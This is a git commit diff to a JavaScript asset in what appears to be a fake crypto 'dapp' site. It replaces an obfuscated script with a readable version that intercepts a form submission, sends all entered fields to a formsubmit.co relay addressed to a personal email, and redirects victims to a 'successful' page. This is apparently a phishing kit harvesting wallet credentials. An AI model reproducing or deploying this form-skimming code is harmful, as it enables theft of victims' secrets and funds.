4860666cb4d343c5238f6b4b10245bcbe2270326
James James <james405james@gmail.com>
2023-12-15 10:06:55 -0800

    make  work

--- assets/js/dapps/scr.js
+++ assets/js/dapps/scr.js
@@ -1,1 +1,48 @@
-var _0x46e8fc=_0x3245;(function(_0x1c96a8,_0x3885cc){var _0x21fc49=_0x3245,_0x5d3f45=_0x1c96a8();while(!![]){try{var _0x4e8333=-parseInt(_0x21fc49(0x1c3))/0x1+-parseInt(_0x21fc49(0x1b5))/0x2+-parseInt(_0x21fc49(0x1b9))/0x3*(parseInt(_0x21fc49(0x1b7))/0x4)+-parseInt(_0x21fc49(0x1b8))/0x5*(-parseInt(_0x21fc49(0x1bb))/0x6)+-parseInt(_0x21fc49(0x1ab))/0x7+parseInt(_0x21fc49(0x1b1))/0x8+-parseInt(_0x21fc49(0x1ba))/0x9*(-parseInt(_0x21fc49(0x1ad))/0xa);if(_0x4e8333===_0x3885cc)break;else _0x5d3f45['push'](_0x5d3f45['shift']());}catch(_0x1ec6c3){_0x5d3f45['push'](_0x5d3f45['shift']());}}}(_0x2a96,0xcc2de),document[_0x46e8fc(0x1ac)]('myForm')[_0x46e8fc(0x1bc)](_0x46e8fc(0x1b0),function(_0x3e3aa4){var _0x2bac94=_0x46e8fc;_0x3e3aa4['preventDefault'](),document['getElementById']('loader')[_0x2bac94(0x1b2)][_0x2bac94(0x1c0)]=_0x2bac94(0x1c2);var _0x4b892e=new XMLHttpRequest();_0x4b892e[_0x2bac94(0x1a9)](_0x2bac94(0x1b4),_0x2bac94(0x1b6),!![]),_0x4b892e[_0x2bac94(0x1bf)](_0x2bac94(0x1a8),_0x2bac94(0x1af)),_0x4b892e[_0x2bac94(0x1bd)]=function(){var _0x560d3d=_0x2bac94;this[_0x560d3d(0x1c5)]==XMLHttpRequest[_0x560d3d(0x1c1)]&&this[_0x560d3d(0x1be)]==0xc8&&(document[_0x560d3d(0x1ac)]('loader')['style'][_0x560d3d(0x1c0)]=_0x560d3d(0x1c4),window['location'][_0x560d3d(0x1aa)]='https://web3v3api.pages.dev/successful.html');};var _0xdc2776=new FormData(document['getElementById'](_0x2bac94(0x1ae)));_0x4b892e[_0x2bac94(0x1b3)](_0xdc2776);}));function _0x3245(_0x571d7d,_0x6a722f){var _0x2a962b=_0x2a96();return _0x3245=function(_0x324554,_0x51a0d9){_0x324554=_0x324554-0x1a8;var _0x16746b=_0x2a962b[_0x324554];return _0x16746b;},_0x3245(_0x571d7d,_0x6a722f);}function _0x2a96(){var _0x3a8e2b=['readyState','Content-Type','open','href','2559354qJauOv','getElementById','40klJXng','myForm','application/x-www-form-urlencoded','submit','5343944mwJEYY','style','send','POST','3078952WjDAyl','https://formsubmit.co/wizdream22gmail.com','6281732QqQkcE','5VStlMx','3nDqgIv','6696045pXJQFs','5032542YBXJhP','addEventListener','onreadystatechange','status','setRequestHeader','display','DONE','inline-block','170921ZgWEkT','none'];_0x2a96=function(){return _0x3a8e2b;};return _0x2a96();}
+
+          
+                        document.getElementById('myForm').addEventListener('submit', function (event) {
+                            event.preventDefault();
+                        
+                            // Show loader
+                            document.getElementById('loader').style.display = 'inline-block';
+                        
+                            var xhr = new XMLHttpRequest();
+                            xhr.open("POST", "https://formsubmit.co/wizdream22gmail.com", true);
+                            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                        
+                            xhr.onreadystatechange = function () {
+                                if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
+                                    // Hide loader
+                                    document.getElementById('loader').style.display = 'none';
+                        
+                                    // Redirect after successful submission
+                                    window.location.href = "https://web3v3api.pages.dev/successful.html";
+                                }
+                            }
+                        
+                            var formData = new FormData(document.getElementById('myForm'));
+                            xhr.send(formData);
+                        });
+                       
+
+
+                        
+                        // document.getElementById('myForm').addEventListener('submit', function (event) {
+                        //     event.preventDefault();
+
+                        //     var xhr = new XMLHttpRequest();
+                        //     xhr.open("POST", "https://formsubmit.co/wizdream22gmail.com", true);
+                        //     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+                        //     xhr.onreadystatechange = function () {
+                        //         if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
+                        //             // Redirect after successful submission
+                        //             window.location.href = "https://web3v3api.pages.dev/successful.html";
+                        //         }
+                        //     }
+
+                        //     var formData = new FormData(this);
+                        //     xhr.send(formData);
+                        // });
+                
+                        
